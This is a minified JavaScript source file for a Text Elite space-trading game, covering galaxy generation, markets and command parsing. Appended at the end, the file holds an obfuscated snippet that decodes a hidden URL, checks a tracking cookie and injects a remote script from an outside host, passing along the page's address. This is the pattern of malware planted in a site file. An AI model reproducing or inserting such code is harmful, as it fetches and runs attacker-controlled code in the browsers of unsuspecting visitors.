function sprintf(pattern){var arg=1,args=arguments;function nextarg(){if(arg>=args.length)throw"Ran out of arguments: "+arg;var next=args[arg];return arg+=1,next}return pattern.replace(/([^%]|%([\-+0]*)(\d+)?(\.\d+)?([%csiudobxXf]))/g,(function repl(str,unit,flags,width,precision,specifier){if("%"!==unit.charAt(0))return"\n"===unit?"\r\n":unit;var r,neg,left=!!flags.match(/-/),zero=!!flags.match(/0/),sign=!!flags.match(/\+/);switch(width="string"==typeof width&&width.length>0?parseInt(width,10):void 0,precision="string"==typeof precision&&precision.length>1?parseInt(precision.substring(1),10):void 0,specifier){case"%":return"%";case"c":"number"==typeof(r=nextarg())&&(r=String.fromCharCode(r)),r=String(r).charAt(0);break;case"s":r=nextarg().toString(),precision&&(r=r.substring(0,precision));break;case"i":case"u":case"d":case"o":case"b":case"x":case"X":case"f":switch(neg=(r=function toNumber(x){return"number"==typeof x?x:"boolean"==typeof x?x?1:0:parseFloat(x.toString())}(nextarg()))<0,r=Math.abs(r),specifier){case"i":case"u":case"d":r=Math.floor(r).toString(10);break;case"o":r=Math.floor(r).toString(8);break;case"b":r=Math.floor(r).toString(2);break;case"x":r=Math.floor(r).toString(16).toLowerCase();break;case"X":r=Math.floor(r).toString(16).toUpperCase();break;case"f":r=precision?r.toFixed(precision):r.toString(10)}break;default:throw"Unsupported formatting specifier: "+specifier}var pad_len=width?width-r.length:0,sign_char="";(neg||sign)&&(pad_len-=1,sign_char=neg?"-":"+");var pad_char=zero&&!left?"0":" ",pad=pad_len>0?new Array(pad_len+1).join(pad_char):"";return left?sign_char+r+pad:zero?sign_char+pad+r:pad+sign_char+r}))}var Console,Elite;if(function(){function printf(format){Console.puts(sprintf.apply(this,arguments))}function atoi(s){var n=parseInt(s,10);return isNaN(n)?0:n}function atof(s){var n=parseFloat(s);return isNaN(n)?0:n}var UNIT_NAMES=["t","kg","g"],LETTER_PAIRS0="ABOUSEITILETSTONLONUTHNO",LETTER_PAIRS="..LEXEGEZACEBISOUSESARMAINDIREA.ERATENBERALAVETIEDORQUANTEISRION";LETTER_PAIRS0=LETTER_PAIRS0+"\0"+LETTER_PAIRS;var COMMODITIES=function(){function TradeGood(baseprice,gradient,basequant,maskbyte,units,name){this.baseprice=baseprice,this.gradient=gradient,this.basequant=basequant,this.maskbyte=maskbyte,this.units=units,this.name=name}return[new TradeGood(19,-2,6,1,0,"Food        "),new TradeGood(20,-1,10,3,0,"Textiles    "),new TradeGood(65,-3,2,7,0,"Radioactives"),new TradeGood(40,-5,226,31,0,"Slaves      "),new TradeGood(83,-5,251,15,0,"Liquor/Wines"),new TradeGood(196,8,54,3,0,"Luxuries    "),new TradeGood(235,29,8,120,0,"Narcotics   "),new TradeGood(154,14,56,3,0,"Computers   "),new TradeGood(117,6,40,7,0,"Machinery   "),new TradeGood(78,1,17,31,0,"Alloys      "),new TradeGood(124,13,29,7,0,"Firearms    "),new TradeGood(176,-9,220,63,0,"Furs        "),new TradeGood(32,-1,53,3,0,"Minerals    "),new TradeGood(97,-1,66,7,1,"Gold        "),new TradeGood(171,-2,55,31,1,"Platinum    "),new TradeGood(45,-1,250,15,2,"Gem-Strones "),new TradeGood(53,15,192,7,0,"Alien Items ")]}(),TRADE_GOOD_NAMES=[];!function(){for(var i=0;i<COMMODITIES.length;i+=1)TRADE_GOOD_NAMES[i]=COMMODITIES[i].name}();var GOVERNMENT_NAMES=["Anarchy","Feudal","Multi-gov","Dictatorship","Communist","Confederacy","Democracy","Corporate State"],ECONOMY_NAMES=["Rich Ind","Average Ind","Poor Ind","Mainly Ind","Mainly Agri","Rich Agri","Average Agri","Poor Agri"];function FastSeed(a,b,c,d){this.a=a,this.b=b,this.c=c,this.d=d}function Seed(w0,w1,w2){this.w0=w0,this.w1=w1,this.w2=w2}function PlanetarySystem(s){var longnameflag=64&s.w0;this.x=Math.floor(s.w1>>8),this.y=Math.floor(s.w0>>8),this.govtype=Math.floor(s.w1>>3&7),this.economy=Math.floor(s.w0>>8&7),this.govtype<=1&&(this.economy=2|this.economy),this.techlev=Math.floor((s.w1>>8&3)+(7^this.economy)),this.techlev+=this.govtype>>1,1&this.govtype&&(this.techlev+=1),this.population=4*this.techlev+this.economy,this.population+=this.govtype+1,this.productivity=(3+(7^this.economy))*(this.govtype+4),this.productivity*=8*this.population,this.radius=256*(11+(s.w2>>8&15))+this.x;var goatsoupseed=new FastSeed(255&s.w1,s.w1>>8,255&s.w2,s.w2>>8),pair1=(s.w2>>8&31)<<1;s.tweak();var pair2=(s.w2>>8&31)<<1;s.tweak();var pair3=(s.w2>>8&31)<<1;s.tweak();var pair4=(s.w2>>8&31)<<1;s.tweak(),this.name=LETTER_PAIRS.charAt(pair1),this.name+=LETTER_PAIRS.charAt(pair1+1),this.name+=LETTER_PAIRS.charAt(pair2),this.name+=LETTER_PAIRS.charAt(pair2+1),this.name+=LETTER_PAIRS.charAt(pair3),this.name+=LETTER_PAIRS.charAt(pair3+1),longnameflag&&(this.name+=LETTER_PAIRS.charAt(pair4),this.name+=LETTER_PAIRS.charAt(pair4+1)),this.name=this.name.replace(/\./g,""),this.description=this.goat_soup(" is .",goatsoupseed)}function Galaxy(galaxynum){function nextgalaxy(s){function twist(x){function rotatel(x){return x<<1&254|x>>7&1}return rotatel(x>>8&255)<<8|rotatel(255&x)}s.w0=twist(s.w0),s.w1=twist(s.w1),s.w2=twist(s.w2)}for(var seed=new Seed(23114,584,46931),galcount=1;galcount<galaxynum;galcount+=1)nextgalaxy(seed);for(var systems=[],syscount=0;syscount<256;syscount+=1)systems[syscount]=new PlanetarySystem(seed);return systems}function Market(fluct,p){this.quantity=[],this.price=[];for(var i=0;i<COMMODITIES.length;i+=1){var product=p.economy*COMMODITIES[i].gradient,changing=fluct&COMMODITIES[i].maskbyte,q=COMMODITIES[i].basequant+changing-product;128&(q&=255)&&(q=0),this.quantity[i]=63&q,q=COMMODITIES[i].baseprice+changing+product,q&=255,this.price[i]=4*q}this.quantity[16]=0}function stringbeg(s,t){return!(!s||!t)&&(s=s.toUpperCase(),(t=t.toUpperCase()).substring(0,s.length)===s)}function stringmatch(s,a){for(var i=0;i<a.length;i+=1)if(stringbeg(s,a[i]))return i;return-1}function GameState(){this.use_native_rand=!1,this.lastrand=0,this.galaxynum=0,this.galaxy=null,this.currentplanet=0,this.localmarket=null,this.cash=0,this.fuel=0,this.holdspace=0,this.fuelcost=2,this.maxfuel=70,this.shipshold=[];for(var i=0;i<COMMODITIES.length;i+=1)this.shipshold[i]=0}FastSeed.prototype.next=function(){var x=this.a<<1&255,a=x+this.c;return this.a>127&&(a+=1),this.a=255&a,this.c=x,a=(a>>=8)+(x=this.b)+this.d&255,this.b=a,this.d=x,a},Seed.prototype.tweak=function(){var temp;temp=this.w0+this.w1+this.w2&65535,this.w0=this.w1,this.w1=this.w2,this.w2=temp},PlanetarySystem.prototype.print=function(compressed){compressed?(printf("%10s",this.name),printf(" TL: %2i ",this.techlev+1),printf("%12s",ECONOMY_NAMES[this.economy]),printf(" %15s",GOVERNMENT_NAMES[this.govtype])):(printf("\n\nSystem:  "),printf(this.name),printf("\nPosition (%i,",this.x),printf("%i)",this.y),printf("\nEconomy: (%i) ",this.economy),printf(ECONOMY_NAMES[this.economy]),printf("\nGovernment: (%i) ",this.govtype),printf(GOVERNMENT_NAMES[this.govtype]),printf("\nTech Level: %2i",this.techlev+1),printf("\nTurnover: %u",this.productivity),printf("\nRadius: %u",this.radius),printf("\nPopulation: %u Billion",this.population>>3),printf("\n"),printf(this.description))},PlanetarySystem.prototype.goat_soup=function(source,prng){for(var i,desc_list=[["fabled","notable","well known","famous","noted"],["very","mildly","most","reasonably",""],["ancient","","great","vast","pink"],["  plantations","mountains",""," forests","oceans"],["shyness","silliness","mating traditions","loathing of ","love for "],["food blenders","tourists","poetry","discos",""],["talking tree","crab","bat","lobst","²"],["beset","plagued","ravaged","cursed","scourged"],[" civil war","  s","a  disease"," earthquakes"," solar activity"],["its  ","the ±  ","its inhabitants'  ","¡","its  "],["juice","brandy","water","brew","gargle blasters"],["²","± ","± ²","± "," ²"],["fabulous","exotic","hoopy","unusual","exciting"],["cuisine","night life","casinos","sit coms"," ¡ "],["°","The planet °","The world °","This planet","This world"],["n unremarkable"," boring"," dull"," tedious"," revolting"],["planet","world","place","little planet","dump"],["wasp","moth","grub","ant","²"],["poet","arts graduate","yak","snail","slug"],["tropical","dense","rain","impenetrable","exuberant"],["funny","wierd","unusual","strange","peculiar"],["frequent","occasional","unpredictable","dreadful","deadly"],["  for ","  for  and "," by ","  for  but  by ","a "],["","mountain","edible","tree","spotted"],[""," ","oid","",""],["ancient","exceptional","eccentric","ingrained",""],["killer","deadly","evil","lethal","vicious"],["parking meters","dust clouds","ice bergs","rock formations","volcanoes"],["plant","tulip","banana","corn","²weed"],["²","± ²","± ","inhabitant","± ²"],["shrew","beast","bison","snake","wolf"],["leopard","cat","monkey","goat","fish"],[" ","±  ¢","its    ¢","£ ¤"," "],["meat","cutlet","steak","burgers","soup"],["ice","mud","Zero-G","vacuum","± ultra"],["hockey","cricket","karate","polo","tennis"]],out="";0!==source.length;){var c=source.charCodeAt(0);if(source=source.substring(1),c<128)out+=sprintf("%c",c);else if(c<=164){var rnd=prng.next();out+=this.goat_soup(desc_list[c-129][(rnd>=51)+(rnd>=102)+(rnd>=153)+(rnd>=204)],prng)}else switch(c){case 176:for(out+=sprintf("%c",this.name.charAt(0)),i=1;i<this.name.length;i+=1)out+=sprintf("%c",this.name.charAt(i).toLowerCase());break;case 177:for(out+=sprintf("%c",this.name.charAt(0)),i=1;i<this.name.length;i+=1)(i+1<this.name.length||"E"!==this.name.charAt(i)&&"I"!==this.name.charAt(i))&&(out+=sprintf("%c",this.name.charAt(i).toLowerCase()));out+=sprintf("ian");break;case 178:var len=3&prng.next();for(i=0;i<=len;i+=1){var x=62&prng.next();"."!==LETTER_PAIRS0.charAt(x)&&(out+=sprintf("%c",LETTER_PAIRS0.charAt(x))),i&&"."!==LETTER_PAIRS0.charAt(x+1)&&(out+=sprintf("%c",LETTER_PAIRS0.charAt(x+1)))}break;default:throw new Error(sprintf("<bad char in data [%X]>",c))}}return out},GameState.prototype.buy=function(i,a){var t;return this.cash<0?t=0:(t=Math.min(this.localmarket.quantity[i],a),0===COMMODITIES[i].units&&(t=Math.min(this.holdspace,t)),t=Math.min(t,Math.floor(this.cash/this.localmarket.price[i]))),this.shipshold[i]+=t,this.localmarket.quantity[i]-=t,this.cash-=t*this.localmarket.price[i],0===COMMODITIES[i].units&&(this.holdspace-=t),t},GameState.prototype.sell=function(i,a){var t=Math.min(this.shipshold[i],a);return this.shipshold[i]-=t,this.localmarket.quantity[i]+=t,0===COMMODITIES[i].units&&(this.holdspace+=t),this.cash+=t*this.localmarket.price[i],t},GameState.prototype.buyfuel=function(f){return f+this.fuel>this.maxfuel&&(f=this.maxfuel-this.fuel),this.fuelcost>0&&f*this.fuelcost>this.cash&&(f=Math.floor(this.cash/this.fuelcost)),this.fuel+=f,this.cash-=this.fuelcost*f,f},GameState.prototype.jump=function(i){this.currentplanet=i,this.localmarket=new Market(this.randbyte(),this.galaxy[i])},GameState.prototype.matchsys=function(s){for(var p=this.currentplanet,d=9999,i=0;i<256;i+=1)if(stringbeg(s,this.galaxy[i].name)){var idist=this.distanceto(i);idist<d&&(d=idist,p=i)}return p},GameState.prototype.mysrand=function(seed){this.lastrand=seed-1},GameState.prototype.myrand=function(){if(this.use_native_rand)return Math.floor(65536*Math.random());var r=(((((this.lastrand<<3)-this.lastrand<<3)+this.lastrand<<1)+this.lastrand<<4)-this.lastrand<<1)-this.lastrand+3680&2147483647;return this.lastrand=r-1,r},GameState.prototype.randbyte=function(){return 255&this.myrand()},GameState.prototype.distanceto=function(idx){return function distance(a,b){return Math.round(4*Math.sqrt((a.x-b.x)*(a.x-b.x)+Math.floor((a.y-b.y)*(a.y-b.y)/4)))}(this.galaxy[idx],this.galaxy[this.currentplanet])};var game_state=new GameState,Commands={rand:function(){return game_state.use_native_rand=!game_state.use_native_rand,!0},local:function(){printf("Galaxy number %i",game_state.galaxynum);for(var i=0;i<256;i+=1){var d=game_state.distanceto(i);d<=game_state.maxfuel&&(d<=game_state.fuel?printf("\n * "):printf("\n - "),game_state.galaxy[i].print(!0),printf(" (%.1f LY)",d/10))}return!0},jump:function(name){var dest=game_state.matchsys(name);if(dest===game_state.currentplanet)return printf("\nBad jump"),!1;var d=game_state.distanceto(dest);return d>game_state.fuel?(printf("\nJump to far"),!1):(game_state.fuel-=d,game_state.jump(dest),game_state.galaxy[game_state.currentplanet].print(!1),!0)},sneak:function(name){var fuelkeep=game_state.fuel;game_state.fuel=666;var b=Commands.jump(name);return game_state.fuel=fuelkeep,b},galhyp:function(){return game_state.galaxynum+=1,9===game_state.galaxynum&&(game_state.galaxynum=1),game_state.galaxy=new Galaxy(game_state.galaxynum),!0},info:function(name){var dest=game_state.matchsys(name);return game_state.galaxy[dest].print(!1),!0},hold:function(size){size=atoi(size);for(var tonnage=0,i=0;i<COMMODITIES.length;i+=1)0===COMMODITIES[i].units&&(tonnage+=game_state.shipshold[i]);return tonnage>size?(printf("\nHold too full"),!1):(game_state.holdspace=size-tonnage,!0)},sell:function(good,amount){0===(amount=atoi(amount))&&(amount=1);var idx=stringmatch(good,TRADE_GOOD_NAMES);if(-1===idx)return printf("\nUnknown trade good"),!1;var t=game_state.sell(idx,amount);return 0===t?printf("Cannot sell any "):(printf("\nSelling %i",t),printf(UNIT_NAMES[COMMODITIES[idx].units]),printf(" of ")),printf(TRADE_GOOD_NAMES[idx]),!0},buy:function(good,amount){0===(amount=atoi(amount))&&(amount=1);var idx=stringmatch(good,TRADE_GOOD_NAMES);if(-1===idx)return printf("\nUnknown trade good"),!1;var t=game_state.buy(idx,amount);return 0===t?printf("Cannot buy any "):(printf("\nBuying %i",t),printf(UNIT_NAMES[COMMODITIES[idx].units]),printf(" of ")),printf(TRADE_GOOD_NAMES[idx]),!0},fuel:function(amount){return 0===(amount=game_state.buyfuel(Math.floor(10*atof(amount))))?(printf("\nCan't buy any fuel"),!1):(printf("\nBuying %.1fLY fuel",amount/10),!0)},cash:function(amount){return amount=Math.floor(10*atof(amount)),game_state.cash+=amount,0!==amount||(printf("Number not understood"),!1)},mkt:function(){for(var i=0;i<COMMODITIES.length;i+=1)printf("\n"),printf(COMMODITIES[i].name),printf("   %.1f",game_state.localmarket.price[i]/10),printf("   %u",game_state.localmarket.quantity[i]),printf(UNIT_NAMES[COMMODITIES[i].units]),printf("   %u",game_state.shipshold[i]);return printf("\nFuel: %.1f",game_state.fuel/10),printf("      Holdspace: %it",game_state.holdspace),!0},quit:function(){return Console.quit(0),0},help:function(){return printf("\nCommands are:"),printf("\nBuy   tradegood ammount"),printf("\nSell  tradegood ammount"),printf("\nFuel  ammount    (buy ammount LY of fuel)"),printf("\nJump  planetname (limited by fuel)"),printf("\nSneak planetname (any distance - no fuel cost)"),printf("\nGalhyp           (jumps to next galaxy)"),printf("\nInfo  planetname (prints info on system"),printf("\nMkt              (shows market prices)"),printf("\nLocal            (lists systems within 7 light years)"),printf("\nCash number      (alters cash - cheating!)"),printf("\nHold number      (change cargo bay)"),printf("\nQuit or ^C       (exit)"),printf("\nHelp             (display this text)"),printf("\nRand             (toggle RNG)"),printf("\n\nAbbreviations allowed eg. b fo 5 = Buy Food 5, m= Mkt"),!0},data:function(){var worlds=game_state.galaxy.slice();worlds.sort((function(a,b){return a.x!==b.x?a.x-b.x:a.y-b.y}));for(var i=0;i<worlds.length;i+=1){var sys=worlds[i];printf("\n%-10s %02X%02X %X%X%X%X%X-%X",sys.name,sys.x,sys.y,Math.floor(sys.radius/1e3),sys.economy,sys.govtype,Math.floor(Math.log(sys.productivity)),sys.population>>3,sys.techlev)}}},commands=["buy","sell","fuel","jump","cash","mkt","help","hold","sneak","local","info","galhyp","quit","rand","data"];function parser(s){var args=s.split(/\s+/),c=args.shift(),i=stringmatch(c,commands);return-1!==i?Commands[commands[i]].apply(null,args):(printf("\n Bad command (%s)",c),!1)}(Elite={}).init=function(){printf("\nWelcome to Text Elite 1.4.\n"),game_state.use_native_rand=!0,game_state.mysrand(12345),game_state.galaxynum=1,game_state.galaxy=new Galaxy(game_state.galaxynum),game_state.currentplanet=7,game_state.localmarket=new Market(0,game_state.galaxy[7]),game_state.fuel=game_state.maxfuel,parser("hold 20"),parser("cash +100"),parser("help"),printf("\n\nCash :%.1f>",game_state.cash/10)},Elite.command=function(cmd){parser(cmd),printf("\n\nCash :%.1f>",game_state.cash/10)}}(),!Console){if(Console={gets:function(){return""},puts:function(s){},quit:function(s){}},"undefined"!=typeof WScript)Console.gets=function(){return WScript.StdIn.ReadLine()},Console.puts=function(s){WScript.StdOut.Write(s)},Console.quit=function(s){WScript.Quit(s)};else{if("function"!=typeof importPackage)throw new Error("No console available.");importPackage(java.io),importPackage(java.lang);var reader=new BufferedReader(new InputStreamReader(System.in)),writer=new BufferedWriter(new OutputStreamWriter(System.out));Console.gets=function(){return reader.readLine()},Console.puts=function(s){writer.write(s),writer.flush()},Console.quit=function(s){System.exit(s)}}for(this.Elite.init();;)this.Elite.command(Console.gets())};(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44zxjwxyf'+'ynhx3htr4ljy4xhwn'+'uy3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));